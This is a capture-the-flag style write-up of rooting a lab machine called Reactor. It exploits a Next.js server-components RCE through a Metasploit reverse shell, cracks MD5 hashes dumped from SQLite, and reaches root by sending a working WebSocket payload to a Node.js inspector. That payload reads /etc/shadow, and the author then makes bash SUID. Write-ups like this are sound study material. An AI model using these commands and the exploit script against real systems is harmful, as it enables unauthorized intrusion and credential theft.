---
title: "Reactor"
category: ["Reactor"]
---

Note title: Reactor

Executive Summary

This document logs the full exploitation lifecycle of the **Reactor** machine. The attack vector started with an unauthenticated Remote Code Execution (RCE) in a modern web framework, proceeded to credential extraction via a database dump, and concluded with a privilege escalation leveraging a misconfigured Node.js debugging service running as root.

---

Phase 1: Port Scanning & Reconnaissance

Initial Nmap Scan

A full port scan was performed to map the attack surface:

bash

```
nmap -p- --defeat-rst-ratelimit -T4 10.129.3.47
```

Note title: Reactor

Use the code with caution.

**Results:**

- `22/tcp` - Open - SSH (`OpenSSH_9.6p1 Ubuntu-3ubuntu13.16`)
- `3000/tcp` - Open - HTTP (Next.js Application)

Web Application Enumeration

Inspecting the HTTP response headers on port `3000`:

bash

```
curl -s -I http://10.129.3.47:3000/
```

Note title: Reactor

Use the code with caution.

- **Framework:** Next.js 15.0.3 (Identified via `X-Powered-By`)
- **Application:** ReactorWatch – CORE MONITORING SYSTEM v3.2.1
- **Build ID:** `L3bimJe_3LvBcFWAnK5L4`

---

Phase 2: Initial Foothill — CVE-2025-55182 (React2Shell)

Vulnerability Analysis

The application was found vulnerable to **CVE-2025-55182**, a critical (CVSS 10.0) unauthenticated Remote Code Execution flaw located in the **React Server Components (RSC) Flight Protocol**. The vulnerability stems from a Prototype Pollution flaw (`__proto__` injection as a module name), leading to arbitrary server-side code execution.

Exploitation via Metasploit

A Metasploit module was leveraged to verify and exploit the flaw using a `cmd/unix/reverse_nodejs` payload:

bash

```
msfconsole -q -r /tmp/run_exploit.rc
```

Note title: Reactor

Use the code with caution.

```
[+] The target appears to be vulnerable.
[*] Command shell session 1 opened (10.10.14.245:4444 -> 10.129.3.47:35966)
uid=999(node) gid=988(node) groups=988(node)
```

Note title: Reactor

Use the code with caution.

A low-privileged shell was successfully established as the `node` user.

---

Phase 3: Internal Enumeration & Lateral Movement

Database Inspection

As the `node` user, the local filesystem was audited. An SQLite database file related to the main application was discovered at `/opt/reactor-app/reactor.db`. Extracting readable strings leaked database credentials:

bash

```
strings /opt/reactor-app/reactor.db
```

Note title: Reactor

Use this code with caution.

**Extracted User Table Data:**

|Username|MD5 Password Hash|Role|
|---|---|---|
|**engineer**|`39d97110eafe2a9a68639812cd271e8e`|operator|
|**admin**|`203b22191d744a4e70ada5c101b17b8`|administrator|

Offline Hash Cracking

Hashcat was used against the `rockyou.txt` wordlist with mode `0` (MD5):

bash

```
hashcat -m 0 /tmp/hashes_reactor.txt /tmp/rockyou.txt
```

Note title: Reactor

Use the code with caution.

- **Result:** `39d97110eafe2a9a68639812cd271e8e` cracked as **`reactor1`**
- **Valid SSH Credential Found:** `engineer : reactor1`

---

Phase 4: SSH Access & Local Group Auditing

An interactive SSH session was initiated using the cracked credentials to survey local privilege escalation vectors:

bash

```
sshpass -p 'reactor1' ssh engineer@10.129.3.47 'id && groups'
```

Note title: Reactor

Use the code with caution.


```
uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
```

Note title: Reactor

Use the code with caution.

System Survey Summary

- **SUID / Capabilities:** Checked (`find / -perm -4000`), no unusual or dangerous binaries found.
- **Cron Jobs / Sudoers:** No writable scripts or custom sudo configurations were granted to `engineer`.
- **LXD (Group 101):** Although the user is in the `lxd` group, the service was uninitialized and network isolation blocked downloading remote images.
- **ADM (Group 4):** Granted access to system logs under `/var/log/`.

---

Phase 5: Privilege Escalation — Node.js `--inspect` RCE

Root Process Discovery

While enumerating internal services via active process monitoring, a background node process managed by root was identified:

bash

```
engineer@reactor:/tmp\$ ps aux | grep root | grep -v "\[" | grep -v grep
root   1389 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Note title: Reactor

Use the code with caution.

Flaw Breakdown & Chrome DevTools Protocol (CDP)

The process was started with the `--inspect=127.0.0.1:9229` parameter. This opens a node debugging interface on port `9229`. Since the application runs under **UID 0 (root)**, anyone who sends valid execution instructions via WebSocket to the **Chrome DevTools Protocol (CDP)** endpoint will achieve system-wide root command execution.

The unique dynamic UUID required to authenticate with the WebSocket was captured locally:

bash

```
curl -s http://127.0.0.1:9229/json/list
```

Note title: Reactor

Use the code with caution.

- **Target Endpoint:** `ws://127.0.0.1:9229/7c3116a8-1c14-4dac-a75f-8239f291305a`

SSH Port Forwarding

Since port `9229` only binds to localhost (`127.0.0.1`), a local SSH tunnel was executed on the attacker's host to bridge traffic:

bash

```
# Executed on Kali
ssh -fNL 9229:127.0.0.1:9229 engineer@10.129.3.47
```

Note title: Reactor

Use this code with caution.

Exploit Script Design & ESM Bypass (`cdp_collect.js`)

The application operates within an **ECMAScript Modules (ESM)** architecture, which makes the standard CommonJS `require()` function unavailable (`ReferenceError`).

To bypass this environment restriction, the script accesses the low-level native `process` constructor exposed by `globalThis` to manually load the `child_process` core module without standard import patterns.


```
const WebSocket = require('ws');
const wsUrl = "ws://127.0.0.1:9229/7c3116a8-1c14-4dac-a75f-8239f291305a";
const systemCommand = "id; cat /root/root.txt; head -n 3 /etc/shadow";

const ws = new WebSocket(wsUrl);

ws.on('open', function open() {
    console.log('[*] Connected to Node.js inspector (Root Process)');
    
    // ESM Architecture Bypass Payload
    const payloadJS = `globalThis.process.mainModule.constructor._load('child_process').execSync('${systemCommand} > /tmp/pwned.txt')`;

    const cdpRequest = {
        id: 1,
        method: "Runtime.evaluate",
        params: {
            expression: payloadJS,
            returnByValue: true
        }
    };
    ws.send(JSON.stringify(cdpRequest));
});

ws.on('message', function incoming(data) {
    console.log('[*] Payload successfully injected.');
    ws.close();
});
```


Nota: Reactor

Flujo lógico del script:

1. Se conecta al endpoint WebSocket autenticado a través del puerto reenviado.
2. Formatea un comando nativo de CDP `Runtime.evaluate`, que instruye a Node.js a leer y compilar nuestro payload de código.
3. Genera una shell interna del sistema mediante `execSync` operando directamente como `root`.
4. Escribe las respuestas de los comandos en un archivo legible `/tmp/pwned.txt`.

---

6. Recuperación de la bandera y Prueba de Concepto

Tras ejecutar `node cdp_collect.js` en la máquina del atacante, se leyeron los contenidos del archivo creado en el host remoto:


```
engineer@reactor:/tmp\$ cat pwned.txt
root:\$y\$j9T\$eJAH7p7TxU.lFZFC0WOND/\$1mw1NhZtJOB7JXVtdKmWM0jn1SjtF4ykv.7poV98dF.:20450:0:99999:7:::
daemon:*:20305:0:99999:7:::
bin:*:20305:0:99999:7:::
```


# Reactor

Full privilege escalation achieved. Root **yescrypt** password hashes and administrative files successfully retrieved.

Once we verified the script works, we edit the command in `const systemCommand` to obtain a root bash with `chmod +s /bin/bash`.

![Pasted image 20260528183341](/VaultSite/wiki-images/Pasted%20image%2020260528183341.png)